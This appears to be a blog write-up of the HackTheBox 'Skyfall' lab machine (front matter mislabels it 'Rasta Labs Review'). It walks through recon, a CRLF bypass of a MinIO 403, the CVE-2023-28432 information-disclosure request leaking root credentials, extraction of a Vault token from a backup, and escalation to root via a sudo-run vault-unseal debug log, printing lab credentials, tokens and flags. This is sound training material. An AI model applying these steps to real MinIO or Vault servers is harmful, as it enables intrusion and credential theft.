---
title: "Rasta Labs Review"
date: 2024-4-17 00:00:00 +0800
categories: [HackTheBox]
tags: [INSANE]
author: 
  - hameed
---
# HTB: Skyfall Walkthrough

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/5e3e52a8-648a-49c5-b20c-a3ce6c56ebac)


# Table of Content

- [Introduction](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Recon, Discovery, and Initial Access](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Reconnaissance](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Exploring the Web Interface](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Discover Skyfall Subdomains](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Exploiting CRLF Injection for Access](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Exploiting MinIO for Access](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Identifying MinIO Public Exploitation](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Leveraging MinIO POC for Initial Access](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Establishing Communication with MinIO Server](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Extracting Secrets from MinIO Backup](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Obtaining Backup Files from MinIO](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Extracting Vault API Tokens from Backup](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Leveraging Vault for User Access](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Understanding Vault Functionality](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Connecting to Vault and Enumerating SSH Roles](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Exploiting Vault to Gain User Privileges → USER FLAG](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Privilege Escalation to Root](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Leveraging Privileged Commands for Root](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Gaining Persistence with Master Tokens](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
    - [Escalating to Root via SSH Role → ROOT FLAG!](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)
- [Conclusion](https://www.notion.so/HTB-Skyfall-Walkthrough-eab4760eb78e4f3a81828d8549dd319d?pvs=21)

---

## Introduction

Hey there!  Buckle up we’re tackling HackTheBox "Skyfall" machine, an Insane-level Machine. It’s packed with a couple of binary exploitations and CVE-2023 vulnerabilities, making it quite a challenging ride. So, without further ado, hop in!

## Recon, Discovery, and Initial Access

### Reconnaissance

Now Let’s get to work! 
The initial step is to conduct a comprehensive port scan of `10.10.11.254` While this process could be time-consuming with `nmap`, we'll opt for a quicker approach by utilizing `rustscan` to swiftly sweep all ports.

![`rustscan -a 10.10.11.254`]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/285c8427-73bb-4c3f-aafb-11ce5052170f)


`rustscan -a 10.10.11.254`

Proceeding with an `nmap` scan to further explore the identified ports.

![`sudo nmap 10.10.11.254 -sC -sV -p 22,80 -A -sS`]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/53085afc-24dc-4b3c-8f27-6bbc598690af)


`sudo nmap 10.10.11.254 -sC -sV -p 22,80 -A -sS`

Gotta resolve the network name to IP addresses first.

![`echo "10.10.11.254    skyfall.htb" | sudo tee -a /etc/hosts`]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/b43e1d2e-a670-4c56-a2d6-56748bab9d8e)


`echo "10.10.11.254    skyfall.htb" | sudo tee -a /etc/hosts`

### Exploring the Web Interface

Nothing actually interesting but a demo page for a subdomain.

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/6b1da2ed-ef1f-4661-9cd7-4457401ab42a)

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/1de1baba-9098-47b7-8e86-8fd39182ef12)


### Discover Skyfall Subdomains

Before getting to Demo, let’s Enumerate on `skyfall.htb` to discover subdomains using `ffuf`

![`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.skyfall.htb/`](https://prod-files-secure.s3.us-west-2.amazonaws.com/6b46735d-0e51-4a80-be8b-7f53fa8e3df4/cbae38f6-766d-47be-a412-15c0935753ff/Untitled.png)

`ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://FUZZ.skyfall.htb/`

`demo.skyfall.htb` was found .. Resolve it on the spot!

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/6fda1a1a-aa0d-4be5-ac2c-205db02c6741)

Let's go straight to `demo.skyfall.htb` .. Get Authenticated with the given `guest:guest` credentials 

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/efe80baa-38bd-4e66-977a-1c743e10503d)


### Exploiting CRLF Injection for Access

It is a MinIO-Based Cloud Storage. Our exploration leads us to MinIO Metrics page, which, returns a Forbidden 403 error. 

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/daa1d6fc-0f81-47d7-bc9c-b12104c6aae6)


![MinIO Metrics Forbidden 403 .png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/47188520-e3ce-4a6b-b1a1-7af54a36dcee)


But a sneaky CRLF Splits that up with `%0a` did the trick! Next up, Landed on The MinIO Internal Metrics and Nothing is Interesting except of the new subdomain at the bottom of the page.

![MinIO Internal Metrics.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/6de6dd37-4078-4c5d-8eea-6159e9b2d0f2)


![`prd23-s3-backend.skyfall.htb`]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/153e914c-33a0-4d65-9e14-a3e7079bc329)


`prd23-s3-backend.skyfall.htb`

Let’s Resolve this name to the network.

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/cca572dc-2af5-41dc-8bf0-b3f0a14a47c2)


Over to the new `prd23-s3-backend.skyfall.htb` .. It seems to be a resources page, but our access is denied. Gotta dig deeper! 

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/b5073688-f581-41e9-b38a-41229ae782ce)


## Exploiting MinIO for Access

### Identifying MinIO Public Exploitation

Bingo! My Google-fu led me straight to a MinIO Exploitation POC targeting information disclosure. → [CVE-2023-28432 MinIO Information Disclosure POC](https://github.com/acheiii/CVE-2023-28432/tree/main)

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/a0937a02-ae7c-4c77-bd9f-1a989e34a447)


### Leveraging MinIO POC for Initial Access

In Burp Suite, An HTTP GET Request to the new Domain would be changed to a POST request straight to this endpoint `/minio/bootstrap/v1/verify` just like the POC demonstrates. Ta-da here is the Credential ..

![GET REquest Will Be Changed.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/f893cc68-bf0d-4329-83dc-51d9adb8c5e1)


![Following the POC to get Root Creds.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/e61ad6b6-8357-4d75-b633-912490d57efe)


```bash
"MINIO_ROOT_USER":"5GrE1B2YGGyZzNHZaIww"
"MINIO_ROOT_PASSWORD":"GkpjkmiVmpFuL2d3oRx0"
```

### Establishing Communication with MinIO Server

We will use these credentials to set an authenticated alias through `mc` [MinIO Client](https://dl.min.io/client/mc/release/linux-amd64/) binary. This will enable us to seamlessly communicate with the server hosted at `http://prd23-s3-backend.skyfall.htb`

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/6c363749-0356-4ede-a0bb-2558c934db15)


![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/4bab498d-4fa9-4251-91d8-5f5cd7cacf53)

```bash
./mc alias set BassalMinio http://prd23-s3-backend.skyfall.htb 5GrE1B2YGGyZzNHZaIww GkpjkmiVmpFuL2d3oRx0 
Added `BassalMinio` successfully.
```

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/2ba339fc-8c59-4ad3-93ae-3868e5cbb53b)


## Extracting Secrets from MinIO Backup

### Obtaining Backup Files from MinIO

Once we've set up the alias, let's proceed to retrieve a specific version of a backup file for the `askyy` user, which contains the API_VAULT_TOKEN.

```bash
1) ./mc ls --recursive --versions BassalMinio #TO RECURSIVLY(ENCLUDING THE SUBDIRECTORIS) LIST OBJECTS
2) ./mc cp --vid 2b75346d-2a47-4203-ab09-3c9f878466b8 BassalMinio/askyy/home_backup.tar.gz ./home_backup.tar.gz # "--vid" Version ID
```

![mc ls.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/b8321594-036c-431b-b420-5c0be520b4df)


![Downloading home_backup.tar.gz .png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/c4533e63-8c12-4ce9-ba6a-53267ea83986)


### Extracting Vault API Tokens from Backup

Extract the file and obtain the API_VAULT_TOKEN using the following steps ..

```bash
1) tar -xvf home_backup.tar.gz # "-x" EXTRACT & "-v" VERBOSE & "-f" FILE TO BE EXTRACTED
2) cat ./.bashrc
		VAULT_API_ADDR="http://prd23-vault-internal.skyfall.htb"
		VAULT_TOKEN="hvs.CAESIJlU9JMYEhOPYv4igdhm9PnZDrabYTobQ4Ymnlq1qY-LGh4KHGh2cy43OVRNMnZhakZDRlZGdGVzN09xYkxTQVE"
```

![Extract and cat bashrc file .png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/749e84b3-c1ee-4b5e-9674-148334dd743c)


![VAULT_ADDR and VAULT_TOKEN.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/434cd98f-5401-4b69-810c-bfba0281b06d)


Also, New subdomain `prd23-vault-internal.skyfall.htb` .. Let’s add it to `/etc/hosts`

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/c7e0a69a-813c-4413-bea4-97c98c252d29)


## Leveraging Vault for User Access

### Understanding Vault Functionality

<aside>
📖 Vault is a powerful tool used for managing secrets and protecting sensitive data in modern IT environments. It provides a secure and centralized platform for storing, accessing, and managing credentials, encryption keys, and other secret information. Vault offers features such as encryption, access control policies, auditing, and dynamic secrets generation, making it an essential component in securing applications, infrastructure, and data in both on-premises and cloud environments.

</aside>

After [Downloading Vault](https://releases.hashicorp.com/vault/1.16.1) and unzipping it, export VAULT_ADDR and VAULT_TOKEN to the Linux environment and run `./vault login` to connect to Vault Binary.

![Downloading Vault.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/93825051-c934-42d7-9754-430424f0b136)


![Vault ls.png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/974d729d-7b44-466f-835c-40f2a420cf14)


![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/5fbaf507-0833-4512-847b-e9c4c9cfd5e4)


### Connecting to Vault and Enumerating SSH Roles

Once inside, let's list the SSH roles with `./vault list ssh/roles` We found two roles: `admin_otp_key_role` and `dev_otp_key_role` Since `askyy` is likely a user, let's give the `dev_otp_key_role` a shot using VAULT_ADDR and VAULT_TOKEN.

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/a9d1da05-b53b-41e5-a514-0500bb56ba39)


### Exploiting Vault to Gain User Privileges → USER FLAG!

```bash
./vault ssh -role dev_otp_key_role -mode OTP -strict-host-key-checking=no askyy@10.10.11.254
# "-mode OTP" -> ONE-TIME PASSWORD & "-strict-host-key-checking=no" -> DISABLES STRICT HOST KEY CHECKING FOR SSH CONNECTIONS.
```

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/3e99fc30-a5d9-43a7-bd49-23b4a069fc54)

`user.txt` → d7b3d601a82550ce3563ab4d7383260a

Using the OTP will be displayed on the screen, SSH into `askyy` and get USER FLAG!

## Privilege Escalation to Root

### Leveraging Privileged Commands for Root

Through running `sudo -l` to list `sudo` privileges for `askyy` user on `skyfall` .. These commands can run NOPASSWD!

```bash
/root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -[vhd]+$ # "-c" CONFIGURATION PATH
#  THE ^ AND $ SYMBOLS DENOTE THE BEGINNING AND END OF THE COMMAND & "-[vhd]" -> "-v" VERBOSE & "-d" DEBUG MODE & "-h" HELP
sudo /root/vault/vault-unseal ^-c /etc/vault-unseal.yaml -vd # WE WILL USE IT THIS WAY
```

![sudo -l askyy user .png]![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/4440ea0d-d578-48ff-8f24-0c4dd350406d)


This command configures Vault and generates a `debug.log` file, which, is root-owned and inaccessible to users. To overcome this hurdle, simply execute the command `touch debug.log` to create the file and then proceed with your command. This will ensure that the file is owned by the user `askyy` and can be catted. 

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/859bc86b-1334-4385-bcd9-0dd6d57de02c)



![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/3a4cad7a-5b22-4c84-966c-13d4c32cdbfb)



### Gaining Persistence with Master Tokens

Using the MASTER_TOKEN extracted from `debug.log` we'll SSH into the Root account. Then, we'll update the old VAULT_TOKEN with the new one.

```bash
export VAULT_TOKEN="hvs.I0ewVsmaKU1SwVZAKR3T0mmG" # MASTER_TOKEN
```

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/4d24175d-1675-4e4e-b77f-6be9a6a6ff71)


### Escalating to Root via SSH Role → ROOT FLAG!

lastly, SSH into `root` using `admin_otp_key_role` with an `otp` as well.

```bash
./vault ssh -role admin_otp_key_role -mode OTP -strict-host-key-checking=no root@10.10.11.254
```

![image](https://github.com/0xliberta/0xliberta.github.io/assets/154480148/a941f112-845b-48e7-b08b-138427d5ad0a)


`root.txt` → 881f5326568c3e41c72a7994884818cf

## [PWNED!](https://www.hackthebox.com/achievement/machine/1675950/586)

## Conclusions

There you have it! Successfully pwned the insane HackTheBox "Skyfall" machine. From navigating binary exploitations to exploiting CVE-2023 vulnerabilities, we've conquered every challenge thrown our way. It's been quite a fall, but we've come out flying.

Thank You For Reading! 
PEACE OUT!
